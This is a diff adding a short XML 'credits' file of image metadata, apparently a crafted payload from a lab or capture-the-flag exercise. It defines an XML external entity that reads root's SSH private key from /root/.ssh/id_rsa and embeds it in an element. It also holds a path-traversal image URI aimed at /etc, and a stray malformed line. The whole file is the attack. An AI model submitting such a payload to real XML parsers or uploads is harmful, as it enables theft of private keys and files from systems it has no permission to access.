@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
+<credits>
+  <author>damian</author>
+  <image>
+    <uri>/../../../../../../etc/KL.jpg</uri>
+    <views>0</views>
+    <foo>&xxe;</foo>
+
+>
+    <uri>/img/shy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/crafty.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/peter.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
